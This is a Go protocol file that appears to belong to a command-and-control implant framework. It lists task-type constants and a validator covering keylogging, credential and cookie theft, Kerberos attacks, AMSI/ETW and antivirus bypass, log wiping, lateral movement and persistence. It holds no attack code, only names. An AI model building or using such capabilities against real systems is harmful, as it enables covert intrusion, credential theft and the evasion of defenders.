package protocol

const (
	TaskTypeTokenListProcs   = "token_list_procs"
	TaskTypeTokenSteal       = "token_steal"
	TaskTypeTokenMake        = "token_make"
	TaskTypeTokenRevert      = "token_revert"
	TaskTypeRev2Self         = "rev2self"
	TaskTypeTokenWhoami      = "token_whoami"
	TaskTypeNamedPipeImp     = "named_pipe_impersonate"
	TaskTypeJuicyPotato      = "juicy_potato"
	TaskTypeFodhelper        = "fodhelper"
	TaskTypeSlui             = "slui"
	TaskTypeEventvwr         = "eventvwr"
	TaskTypeComputerDefaults = "computerdefaults"
	TaskTypeSSHLateral       = "ssh_lateral"
	TaskTypeSSHKeygen        = "ssh_keygen"
	TaskTypeSSHTunnel        = "ssh_tunnel"
	TaskTypeSCPUpload        = "scp_upload"
	TaskTypeCloudSteal       = "cloud_steal"
	TaskTypeADCSESC1         = "adcs_esc1"
	TaskTypeADCSESC2         = "adcs_esc2"
	TaskTypeADCSESC3         = "adcs_esc3"
	TaskTypeADCSESC4         = "adcs_esc4"
	TaskTypeADCSESC5         = "adcs_esc5"
	TaskTypeADCSESC6         = "adcs_esc6"
	TaskTypeADCSESC7         = "adcs_esc7"
	TaskTypeADCSESC8         = "adcs_esc8"
	TaskTypeADCSFullAudit    = "adcs_full_audit"
	TaskTypeSetSleepMode     = "set_sleep_mode"
	TaskTypeGetSleepMode     = "get_sleep_mode"
	TaskTypeProfileRotate    = "profile_rotate"
	TaskTypeConfigPush       = "config_push"
	TaskTypeEdrStatus        = "edr_status"
	TaskTypeGhostModeStatus  = "ghost_mode_status"
	TaskTypeGhostModeExit    = "ghost_mode_exit"
	TaskTypeShell            = "shell"
	TaskTypePS               = "ps"
	TaskTypeScreenshot       = "screenshot"
	TaskTypeScreenshotWin    = "screenshot_window"
	TaskTypeScreenStreamSt   = "screen_stream_start"
	TaskTypeScreenStreamSp   = "screen_stream_stop"
	TaskTypeKeylogStart      = "keylogger_start"
	TaskTypeKeylogStop       = "keylogger_stop"
	TaskTypeKeylogDump       = "keylogger_dump"
	TaskTypeSuspend          = "suspend"
	TaskTypeResume           = "resume"
	TaskTypeKillProc         = "killproc"
	TaskTypeClipboardGet     = "clipboard_get"
	TaskTypeClipboardSet     = "clipboard_set"
	TaskTypeFind             = "find"
	TaskTypeRegGet           = "reg_get"
	TaskTypeRegSet           = "reg_set"
	TaskTypeRegDelete        = "reg_delete"
	TaskTypeReboot           = "reboot"
	TaskTypeShutdown         = "shutdown"
	TaskTypeDrives           = "drives"
	TaskTypeBeaconNow        = "beacon_now"
	TaskTypeServices         = "services"
	TaskTypePortscan         = "portscan"
	TaskTypeNetstat          = "netstat"
	TaskTypeUsers            = "users"
	TaskTypeAV               = "av"
	TaskTypeDownloadURL      = "download_url"
	TaskTypeUninstall        = "uninstall"
	TaskTypeSetSleep         = "set_sleep"
	TaskTypeCreds            = "creds"
	TaskTypeInject           = "inject"
	TaskTypeInjectMethods    = "inject_methods"
	TaskTypeListInjectMeth   = "list_inject_methods"
	TaskTypeSpawn            = "spawn"
	TaskTypeShinject         = "shinject"
	TaskTypeShspawn          = "shspawn"
	TaskTypeLateral          = "lateral"
	TaskTypeLateralWMI       = "lateral_wmi"
	TaskTypeLateralWinRM     = "lateral_winrm"
	TaskTypeLateralPsexec    = "lateral_psexec"
	TaskTypeLateralDCOM      = "lateral_dcom"
	TaskTypeLateralSCF       = "lateral_scf"
	TaskTypeLateralList      = "lateral_list"
	TaskTypeNetScanSMB       = "net_scan_smb"
	TaskTypeNetEnumHosts     = "net_enum_hosts"
	TaskTypeSocks            = "socks"
	TaskTypeKillAV           = "kill_av"
	TaskTypeElevate          = "elevate"
	TaskTypeBOF              = "bof"
	TaskTypeElevatePN        = "elevate_printnightmare"
	TaskTypeExecAssembly     = "execute_assembly"
	TaskTypeKerberoast       = "kerberoast"
	TaskTypeMimikatz         = "mimikatz"
	TaskTypeDPAPIMasterKey   = "dpapi_masterkey"
	TaskTypeDPAPIBlob        = "dpapi_blob"
	TaskTypeDPAPIBrowser     = "dpapi_browser"
	TaskTypeLSABypass        = "lsa_bypass"
	TaskTypeADCSFind         = "adcs_find"
	TaskTypeADCSRequest      = "adcs_request"
	TaskTypeShadowCreds      = "shadow_creds"
	TaskTypeLDAPUsers        = "ldap_users"
	TaskTypeLDAPGroups       = "ldap_groups"
	TaskTypeLDAPComputers    = "ldap_computers"
	TaskTypeLDAPSPN          = "ldap_spn"
	TaskTypeLDAPACL          = "ldap_acl"
	TaskTypeLDAPQuery        = "ldap_query"
	TaskTypeLS               = "ls"
	TaskTypeDelete           = "delete"
	TaskTypeRead             = "read"
	TaskTypeDownload         = "download"
	TaskTypeUpload           = "upload"
	TaskTypeNet              = "net"
	TaskTypePowerpick        = "powerpick"
	TaskTypePELoader         = "peloader"
	TaskTypeExecAssemblyFR   = "execute_assembly_forkrun"
	TaskTypeRPortFwdStart    = "rportfwd_start"
	TaskTypeRPortFwdStop     = "rportfwd_stop"
	TaskTypeDCSync           = "dcsync"
	TaskTypeGoldenTicket     = "golden_ticket"
	TaskTypeSilverTicket     = "silver_ticket"
	TaskTypeASREPRoast       = "asreproast"
	TaskTypePassTheHash      = "pass_the_hash"
	TaskTypePassTheTicket    = "pass_the_ticket"
	TaskTypePersistenceAdd   = "persistence_add"
	TaskTypePersistenceList  = "persistence_list"
	TaskTypePersistenceRem   = "persistence_remove"
	TaskTypeBrowserSteal     = "browser_steal"
	TaskTypeCookieExport     = "cookie_export"
	TaskTypeVPNCreds         = "vpn_creds"
	TaskTypeWifiCreds        = "wifi_creds"
	TaskTypePrivescCheck     = "privesc_check"
	TaskTypeRemoteInput      = "remote_input"
	TaskTypeUACBypass        = "uac_bypass"
	TaskTypeAMSIByPass       = "amsi_bypass"
	TaskTypeETWByPass        = "etw_bypass"
	TaskTypeETWNtraceBypass  = "etw_ntrace_bypass"
	TaskTypeAMSISessionByp   = "amsi_session_bypass"
	TaskTypeBlockDLLs        = "blockdlls"
	TaskTypeUnhookNtdll      = "unhook_ntdll"
	TaskTypeProtectProcess   = "protect_process"
	TaskTypeRunEvasion       = "run_evasion"
	TaskTypeCleanup          = "cleanup"
	TaskTypeLogWipe          = "log_wipe"
	TaskTypeTrackWipe        = "track_wipe"
	TaskTypeSelfDelete       = "self_delete"
	TaskTypeKill             = "kill"
	TaskTypeSelfUpdate       = "self_update"
	TaskTypeReflectDLLInject = "reflectdll_inject"

	// NTLM Relay & Coerce
	TaskTypeCoercePrinterBug = "coerce_printerbug"
	TaskTypeCoercePetitPotam = "coerce_petitpotam"
	TaskTypeCoerceDFS        = "coerce_dfs"
	TaskTypeRelayNTLMStart   = "relay_ntlm_start"
	TaskTypeRelayNTLMStop    = "relay_ntlm_stop"
	TaskTypeNTLMHelp         = "ntlm_help"

	// Macro / VBA
	TaskTypeMacroExecute = "macro_execute"

	// Certificate Store Theft
	TaskTypeCertStoreList = "cert_store_list"

	// CLR In-Process Execution
	TaskTypeCLRExecAssembly = "clr_exec_assembly"
	TaskTypeCLRPowerShell   = "clr_powershell"

	// Egress Detection
	TaskTypeRunEgress = "run_egress"

	// BloodHound / SharpHound
	TaskTypeSharpHound = "sharphound"

	// Multi-C2 Mode
	TaskTypeSetC2Mode = "set_c2_mode"

	// Interactive Shell
	TaskTypeInteractiveShellStart = "interactive_shell_start"
	TaskTypeInteractiveShellWrite = "interactive_shell_write"
	TaskTypeInteractiveShellStop  = "interactive_shell_stop"
	TaskTypeShellOutput           = "shell_output"

	// Tunnel / Reverse Network Tunnel (Chisel/ligolo-style)
	TaskTypeTunnelAddRoute    = "tunnel_add_route"
	TaskTypeTunnelRemoveRoute = "tunnel_remove_route"

	// P2P Mesh Auto-Discovery
	TaskTypeGossipDiscover = "gossip_discover"

	// Chrome C2
	TaskTypeChromeC2         = "chrome_c2"
	TaskTypeChromeExec       = "chrome_exec"
	TaskTypeChromeScript     = "chrome_script"
	TaskTypeChromeCookies    = "chrome_cookies"
	TaskTypeChromeBookmarks  = "chrome_bookmarks"
	TaskTypeChromeHistory    = "chrome_history"
	TaskTypeChromeTabs       = "chrome_tabs"
	TaskTypeChromeDownload   = "chrome_download"
	TaskTypeChromeStorage    = "chrome_storage"
	TaskTypeChromeScreenshot = "chrome_screenshot"
	TaskTypeChromeClipboard  = "chrome_clipboard"
	TaskTypeChromeIdle       = "chrome_idle"

	// Container escape
	TaskTypeContainerDetect = "container_detect"
	TaskTypeContainerEscape = "container_escape"
	TaskTypeContainerDocker = "container_docker"
	TaskTypeContainerK8s    = "container_k8s"

	// Sleep Mask Kit
	TaskTypeSetSleepMask         = "set_sleep_mask"
	TaskTypeSetSleepMaskAdvanced = "set_sleep_mask_advanced"

	// Sandbox Detection
	TaskTypeSandboxDetect         = "sandbox_detect"
	TaskTypeSandboxDetectAdvanced = "sandbox_detect_advanced"

	// AMSI/ETW Hardware Breakpoint Methods
	TaskTypeAMSIHardwareBP = "amsi_hardware_bp"
	TaskTypeETWHardwareBP  = "etw_hardware_bp"

	// Working Hours
	TaskTypeSetWorkingHours = "set_working_hours"

	// Per-Agent Kill Date
	TaskTypeSetKillDate   = "set_kill_date"
	TaskTypeClearKillDate = "clear_kill_date"

	// BOF Infection — download BOF from server and execute from memory
	TaskTypeBOFInfection = "bof_infection"

	// Kernel-Level Evasion
	TaskTypeEvasionKernelCallback = "kernel_callback"
	TaskTypeEvasionETWTI          = "etwti"
	TaskTypeEvasionEnumCallbacks  = "enum_callbacks"
	TaskTypeEvasionObjCB          = "objcb"
	TaskTypeEvasionImgLoad        = "imgload"

	// Kerberos Advanced Attacks
	TaskTypeFindDelegation   = "find_delegation"
	TaskTypeConstrainedDeleg = "constrained_deleg"
	TaskTypeRBCD             = "rbcd"
	TaskTypeBronzeBit        = "bronze_bit"
	TaskTypeAdminSDHolder    = "adminsdholder"
	TaskTypeDCSyncMachine    = "dcsync_machine"

	// Crypto Key Rotation
	TaskTypeKeyRotate = "key_rotate"

	// Prank / Fun Tasks
	TaskTypeWallpaperChange = "wallpaper_change"
	TaskTypeMsgBox          = "msgbox"
	TaskTypePlaySound       = "play_sound"
	TaskTypeOpenURL         = "open_url"
	TaskTypeScreenRotate    = "screen_rotate"
	TaskTypeCDRomTray       = "cdrom_tray"
	TaskTypeNotepadSpam     = "notepad_spam"
	TaskTypeLockWorkstation = "lock_workstation"
	TaskTypeSetVolume       = "set_volume"
	TaskTypeCursorFlip      = "cursor_flip"

	// Process Tree
	TaskTypeProcessTree = "process_tree"
)

// AllTaskTypes returns every defined task type constant in a deduplicated slice.
func AllTaskTypes() []string {
	return []string{
		TaskTypeShell,
		TaskTypePS,
		TaskTypeScreenshot,
		TaskTypeScreenshotWin,
		TaskTypeScreenStreamSt,
		TaskTypeScreenStreamSp,
		TaskTypeKeylogStart,
		TaskTypeKeylogStop,
		TaskTypeKeylogDump,
		TaskTypeSuspend,
		TaskTypeResume,
		TaskTypeKillProc,
		TaskTypeClipboardGet,
		TaskTypeClipboardSet,
		TaskTypeFind,
		TaskTypeRegGet,
		TaskTypeRegSet,
		TaskTypeRegDelete,
		TaskTypeReboot,
		TaskTypeShutdown,
		TaskTypeDrives,
		TaskTypeBeaconNow,
		TaskTypeServices,
		TaskTypePortscan,
		TaskTypeNetstat,
		TaskTypeUsers,
		TaskTypeAV,
		TaskTypeDownloadURL,
		TaskTypeUninstall,
		TaskTypeSetSleep,
		TaskTypeCreds,
		TaskTypeInject,
		TaskTypeInjectMethods,
		TaskTypeListInjectMeth,
		TaskTypeSpawn,
		TaskTypeShinject,
		TaskTypeShspawn,
		TaskTypeLateral,
		TaskTypeLateralWMI,
		TaskTypeLateralWinRM,
		TaskTypeLateralPsexec,
		TaskTypeLateralDCOM,
		TaskTypeLateralSCF,
		TaskTypeLateralList,
		TaskTypeNetScanSMB,
		TaskTypeNetEnumHosts,
		TaskTypeSocks,
		TaskTypeKillAV,
		TaskTypeElevate,
		TaskTypeBOF,
		TaskTypeElevatePN,
		TaskTypeExecAssembly,
		TaskTypeKerberoast,
		TaskTypeMimikatz,
		TaskTypeDPAPIMasterKey,
		TaskTypeDPAPIBlob,
		TaskTypeDPAPIBrowser,
		TaskTypeLSABypass,
		TaskTypeADCSFind,
		TaskTypeADCSRequest,
		TaskTypeShadowCreds,
		TaskTypeLDAPUsers,
		TaskTypeLDAPGroups,
		TaskTypeLDAPComputers,
		TaskTypeLDAPSPN,
		TaskTypeLDAPACL,
		TaskTypeLDAPQuery,
		TaskTypeLS,
		TaskTypeDelete,
		TaskTypeRead,
		TaskTypeDownload,
		TaskTypeUpload,
		TaskTypeNet,
		TaskTypePowerpick,
		TaskTypePELoader,
		TaskTypeExecAssemblyFR,
		TaskTypeRPortFwdStart,
		TaskTypeRPortFwdStop,
		TaskTypeDCSync,
		TaskTypeGoldenTicket,
		TaskTypeSilverTicket,
		TaskTypeASREPRoast,
		TaskTypePassTheHash,
		TaskTypePassTheTicket,
		TaskTypePersistenceAdd,
		TaskTypePersistenceList,
		TaskTypePersistenceRem,
		TaskTypeBrowserSteal,
		TaskTypeCookieExport,
		TaskTypeVPNCreds,
		TaskTypeWifiCreds,
		TaskTypePrivescCheck,
		TaskTypeRemoteInput,
		TaskTypeUACBypass,
		TaskTypeAMSIByPass,
		TaskTypeETWByPass,
		TaskTypeETWNtraceBypass,
		TaskTypeAMSISessionByp,
		TaskTypeBlockDLLs,
		TaskTypeUnhookNtdll,
		TaskTypeProtectProcess,
		TaskTypeRunEvasion,
		TaskTypeCleanup,
		TaskTypeLogWipe,
		TaskTypeTrackWipe,
		TaskTypeSelfDelete,
		TaskTypeKill,
		TaskTypeSelfUpdate,
		TaskTypeReflectDLLInject,
		TaskTypeCoercePrinterBug,
		TaskTypeCoercePetitPotam,
		TaskTypeCoerceDFS,
		TaskTypeRelayNTLMStart,
		TaskTypeRelayNTLMStop,
		TaskTypeNTLMHelp,
		TaskTypeMacroExecute,
		TaskTypeCertStoreList,
		TaskTypeCLRExecAssembly,
		TaskTypeCLRPowerShell,
		TaskTypeRunEgress,
		TaskTypeSharpHound,
		TaskTypeSetC2Mode,
		TaskTypeInteractiveShellStart,
		TaskTypeInteractiveShellWrite,
		TaskTypeInteractiveShellStop,
		TaskTypeShellOutput,
		TaskTypeTunnelAddRoute,
		TaskTypeTunnelRemoveRoute,
		TaskTypeGossipDiscover,
		TaskTypeChromeC2,
		TaskTypeChromeExec,
		TaskTypeChromeScript,
		TaskTypeChromeCookies,
		TaskTypeChromeBookmarks,
		TaskTypeChromeHistory,
		TaskTypeChromeTabs,
		TaskTypeChromeDownload,
		TaskTypeChromeStorage,
		TaskTypeChromeScreenshot,
		TaskTypeChromeClipboard,
		TaskTypeChromeIdle,
		TaskTypeContainerDetect,
		TaskTypeContainerEscape,
		TaskTypeContainerDocker,
		TaskTypeContainerK8s,
		TaskTypeSetSleepMask,
		TaskTypeSetSleepMaskAdvanced,
		TaskTypeSandboxDetect,
		TaskTypeSandboxDetectAdvanced,
		TaskTypeAMSIHardwareBP,
		TaskTypeETWHardwareBP,
		TaskTypeSetWorkingHours,
		TaskTypeSetKillDate,
		TaskTypeClearKillDate,
		TaskTypeBOFInfection,
		TaskTypeEvasionKernelCallback,
		TaskTypeEvasionETWTI,
		TaskTypeEvasionEnumCallbacks,
		TaskTypeEvasionObjCB,
		TaskTypeEvasionImgLoad,
		TaskTypeFindDelegation,
		TaskTypeConstrainedDeleg,
		TaskTypeRBCD,
		TaskTypeBronzeBit,
		TaskTypeAdminSDHolder,
		TaskTypeDCSyncMachine,
		TaskTypeTokenListProcs,
		TaskTypeTokenSteal,
		TaskTypeTokenMake,
		TaskTypeTokenRevert,
		TaskTypeRev2Self,
		TaskTypeTokenWhoami,
		TaskTypeNamedPipeImp,
		TaskTypeJuicyPotato,
		TaskTypeFodhelper,
		TaskTypeSlui,
		TaskTypeEventvwr,
		TaskTypeComputerDefaults,
		TaskTypeSSHLateral,
		TaskTypeSSHKeygen,
		TaskTypeSSHTunnel,
		TaskTypeSCPUpload,
		TaskTypeCloudSteal,
		TaskTypeADCSESC1,
		TaskTypeADCSESC2,
		TaskTypeADCSESC3,
		TaskTypeADCSESC4,
		TaskTypeADCSESC5,
		TaskTypeADCSESC6,
		TaskTypeADCSESC7,
		TaskTypeADCSESC8,
		TaskTypeADCSFullAudit,
		TaskTypeSetSleepMode,
		TaskTypeGetSleepMode,
		TaskTypeProfileRotate,
		TaskTypeConfigPush,
		TaskTypeEdrStatus,
		TaskTypeGhostModeStatus,
		TaskTypeGhostModeExit,
		TaskTypeKeyRotate,

		// Prank / Fun Tasks
		TaskTypeWallpaperChange,
		TaskTypeMsgBox,
		TaskTypePlaySound,
		TaskTypeOpenURL,
		TaskTypeScreenRotate,
		TaskTypeCDRomTray,
		TaskTypeNotepadSpam,
		TaskTypeLockWorkstation,
		TaskTypeSetVolume,
		TaskTypeCursorFlip,

		// Process Tree
		TaskTypeProcessTree,
	}
}

var validTaskTypeSet map[string]struct{}

func init() {
	types := AllTaskTypes()
	validTaskTypeSet = make(map[string]struct{}, len(types))
	for _, t := range types {
		validTaskTypeSet[t] = struct{}{}
	}
}

// ValidTaskType returns true if the given type is a known task type constant.
func ValidTaskType(t string) bool {
	_, ok := validTaskTypeSet[t]
	return ok
}
